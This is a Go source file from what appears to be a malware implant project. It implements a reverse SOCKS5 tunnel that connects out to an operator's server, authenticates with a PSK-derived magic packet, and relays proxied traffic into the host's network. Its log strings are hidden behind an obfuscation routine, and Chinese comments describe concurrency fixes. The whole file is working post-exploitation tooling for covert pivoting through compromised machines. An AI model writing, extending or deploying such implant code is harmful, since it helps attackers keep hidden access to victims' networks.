package Proxy

import (
	"fmt"
	"implant/core/obfs"
	"crypto/sha256"
	"crypto/tls"
	"implant/core/services/proxy/bufferpool"
	"implant/core/services/proxy/mux"
	"log"
	"math"
	"net"
	"sync"
)

var (
	bufferPool  = bufferpool.NewPool(math.MaxUint16)
	magicPacket = [64]byte{
		0x6a, 0x1d, 0x3e, 0x74, 0x8b, 0x99, 0x5a, 0x7f,
		0xca, 0xef, 0x33, 0x88, 0xac, 0x44, 0x52, 0xbd,
		0x1e, 0x5f, 0x39, 0xd4, 0x6c, 0xb3, 0x72, 0xf8,
		0x21, 0x9d, 0x54, 0x68, 0x91, 0xab, 0x43, 0xee,
		0x4c, 0x7a, 0x90, 0x26, 0xf7, 0x35, 0x9b, 0x5e,
		0xd1, 0x88, 0x4f, 0xbc, 0x2a, 0x67, 0x91, 0xe4,
		0xaf, 0x34, 0xcd, 0x89, 0x60, 0x18, 0xa2, 0xde,
		0x77, 0x93, 0xfb, 0x02, 0x6e, 0x11, 0xc3, 0xf0,
	}
)
var (
	// K7: Session 以互斥锁保护——原裸全局变量在 agent goroutine 写 / 停止命令读之间
	// 存在数据竞争；且重复启动会覆盖旧会话导致其无法被停止（goroutine 泄漏）。
	sessionMu sync.Mutex
	Session   *mux.Mux
)

// deriveTunnelMagic 从会话 PSK 派生 64 字节魔法包（与服务端 DeriveMagicPacket 一致）
func deriveTunnelMagic(psk string) [64]byte {
	var out [64]byte
	h := sha256.New()
	h.Write([]byte("http-tunnel-magic-v1"))
	h.Write([]byte(psk))
	sum := h.Sum(nil)
	copy(out[:], sum)
	copy(out[32:], sum)
	return out
}

// Start a socks5 server and tunnel the traffic to the server at address.
func ReverseSocksAgent(serverAddress, psk string, useTLS bool) {
	log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoFqBpVvUx5FDcyQDKAyuhyUKEE7KKijfdWslG56Y="))
	log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoH6tpWuAT5mfayDDmADqfoA=="))
	log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM3LXrA1pVfkT5FDVyRbvAyeAf5BHYsFKVw=="), serverAddress))
	log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM3LXrA1p4zbV6E/LyTXh3JsV/g=="),  len(psk)))
	log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM3LXrA1pV9gh5k7ceMMU3JsV7A=="), useTLS))

	// 🔧 添加重试机制
	for retry := 0; retry < 3; retry++ {
		if retry > 0 {
			log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGKRpVMkyJL6SgC6uYTbYNZgv53+JqjAV/FA="), retry+1))
		}

		var conn net.Conn
		var err error

		log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGLdpW9oA51TRyQf3tfRz0V4hxGyKrjTeS9abbCz3"), serverAddress))

		if useTLS {
			log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGLBpV9gh5k7ceMMUDgSufINids9B"))
			conn, err = tls.Dial("tcp", serverAddress, nil)
		} else {
			log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoALBpV9gh5k7ceMwXDgSufINids9B"))
			conn, err = net.Dial("tcp", serverAddress)
		}

		if err != nil {
			log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BqAAChDPt4j3+RiD6vUh4Qsupr9MQLwjmaN848pKYRwW076UQ="), retry+1, err))
			if retry == 2 {
				log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoFohpVewe50b9xQjKDhSlf5BAvUXezCGePcItqp06DeuYJI0DrHuN"))
				return
			}
			continue
		}

		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BrCQChDPt4j3+SpB+ibCQ="))

		// 发送魔法包认证（从会话 PSK 派生，与服务端 DeriveMagicPacket 一致）
		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGLBpVuoP6Fr1xSLTAAilf4FCsF70zDS3OtAFpKYFxnk1"))
		magicPacket := deriveTunnelMagic(psk)
		_, err = conn.Write(magicPacket[:])
		if err != nil {
			log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BqAACsPPR3gVudgRuhVS7VFogi/FCHkDAB8lvX"), err))
			conn.Close()
			if retry == 2 {
				return
			}
			continue
		}

		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BrCQCgHvF4sk+RoAqiaSrZGowh0HGKrgo="))

		// 创建多路复用会话
		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGKBpVu0F5GHOySvdDgyff6lKv3XHwCmhOtE8Yieq"))
		sessionMu.Lock()
		// K7: 幂等——已有会话则先关闭旧会话，防止重复启动泄漏
		if Session != nil {
			Session.Close()
			Session = nil
		}
		Session = mux.Server(conn, psk)
		sessionMu.Unlock()
		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BrCQCsF/92tnWRiAKgchPUJpcv93yKkyfeWuVE97M="))

		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGK1pVMgX5GTxyhPKAzGRf5RvvW7+zCCMNeQlqrwFAOiFKrw4ZNsG"))

		for {
			stream, err := Session.AcceptStream()
			if err != nil {
				log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BqAACvPcB7jk2SmQ6iQgrYLqj9eMQZ"), err))
				break
			}
			log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGLdpVfEo5FLEyhn3ASG0fLhGsF7xwhue"))
			go func() {
				log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGKRpVtke5H3/ySvDASu2fLhGsF7xwhue/FCP"))
				// Note ServeConn() will take overship of stream and close it.
				if err := ServeConn(stream); err != nil && err != mux.ErrPeerClosedStream {
					log.Printf("%s", fmt.Sprintf(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BqAACsF+F5kVySmQ6vWSXWFKgi/FCHkDAB8lvX"), err))
				} else {
					log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM7BrCQCvBuR2vkSSoiqiQj/XCosi9m2JrAU="))
				}
			}()
		}

		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGLppVuAt6E3ZySvdDgyff6lKv3XHwCmhOtE8Yieq"))
		sessionMu.Lock()
		if Session != nil {
			Session.Close()
			Session = nil
		}
		sessionMu.Unlock()

		// 如果达到这里，说明连接正常结束，不需要重试
		break
	}

	log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoGLppVuoT5Erlf8AErejVNK8h0FaIjzreZcxEzZViRfU="))
}

// StopReverseSocks5 停止反向SOCKS5隧道：关闭全局会话，
// 使 AcceptStream 返回错误并终止 agent goroutine（真正关闭而非仅回执）
func StopReverseSocks5() {
	sessionMu.Lock()
	defer sessionMu.Unlock()
	if Session != nil {
		log.Print(obfs.Dec("JmneH0WhXmWHW+clZ9GDM6JoF7FpVfEo5FLEyQr0Dyydf5x6vFrLyym3N/sSpZ4pDdiWKaIMGbpr/VDblXaHbvA0"))
		Session.Close()
		Session = nil
	}
}
